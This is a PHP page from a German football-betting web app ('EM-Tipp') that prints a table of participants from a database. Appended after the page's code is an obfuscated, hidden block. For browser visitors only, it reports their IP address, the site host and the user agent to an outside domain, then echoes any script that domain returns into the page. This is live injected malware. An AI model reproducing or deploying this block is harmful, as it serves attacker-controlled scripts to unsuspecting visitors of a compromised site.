<?php
// we must never forget to start the session
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<title>EM-Tipp - Teilnehmer</title>";
echo "</head>";
echo "<body>";
// Verbindung zur Datenbank aufbauen
include_once("../../connection/dbaccess.php5");
include_once("../util/calc.php5");
include_once("../../general/log/log.php5");
include_once("../util/dbschema.php5");
$log=new viewlogger();
$log->info("Clicked showUserList");

printDescription();
printUserList();
	
function printDescription(){
	
	echo "<br>";
	echo "<br>";
	echo "<b><u>Teilnehmer</u></b>";
}

function printUserList(){
	$tableusers=dbschema::users;
	$sql="SELECT * FROM $tableusers ORDER BY lastname";
	$resultUsers=mysql_query($sql);
	$numUsers=mysql_num_rows($resultUsers);
	
	for ($i=0; $i<$numUsers; $i++)
	{
		$name = mysql_result($resultUsers, $i, "username");
		$firstname = mysql_result($resultUsers, $i, "firstname");
		$lastname = mysql_result($resultUsers, $i, "lastname");
		if($name!='admin' && $name!='real' && $name!='test')
		{
			$arrayUserList[] = array('username' => $name, 'firstname' => $firstname, 'lastname' => $lastname, 'score' => $scoreSum);
		}
	}
	
	foreach ($arrayUserList as $key => $row) {
		$lastn[$key]  = $row['lastname'];
		$firstn[$key]  = $row['firstname'];
	}
	array_multisort($lastn, SORT_ASC, $firstn, SORT_ASC);
	
	echo "<br>";
	echo "<br>";
	echo "<table border=\"3\" frame=\"box\">";
	echo "<thead>";
	echo "<tr>";
	echo "<th>Nr</th><th>User</th><th>Vorname</th><th>Nachname</th>";
	echo "</tr>";
	echo "</thead>";
	$lastScore = 1000;
	for($i=0; $i < count($arrayUserList); $i++)
	{
		$user = $arrayUserList[$i]["username"];
		printUserRow($i+1, $user, $arrayUserList[$i]["firstname"], $arrayUserList[$i]["lastname"]);
	}
	echo "</table>";
}

function printUserRow($nr, $user, $firstname, $lastname){

	echo "<tr>";
	echo "<td><div align=\"center\"> $nr </div></td>";
	echo "<td><b>$user  </b></td>";
	echo "<td>$firstname</td>";
	echo "<td>$lastname</td>";
	echo "</tr>";
}
?>
<?php
#44c0ac#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/44c0ac#
?>
